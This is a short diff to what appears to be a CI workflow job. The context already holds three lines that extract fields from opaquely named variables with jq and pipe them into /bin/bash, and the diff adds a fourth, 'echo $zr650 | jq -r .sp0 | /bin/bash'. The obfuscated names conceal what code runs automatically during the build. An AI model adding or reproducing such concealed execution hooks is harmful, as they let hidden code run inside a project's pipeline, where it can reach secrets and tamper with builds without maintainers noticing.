@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$d133" | jq -r .cta144 | /bin/bash
           printf '%s' "$unpr70537" | jq -r .avesj897 | /bin/bash
           echo $w7 | jq -r .vvk84 | /bin/bash
+          echo $zr650 | jq -r .sp0 | /bin/bash
 
       - name: Upload artifact
         if: always()
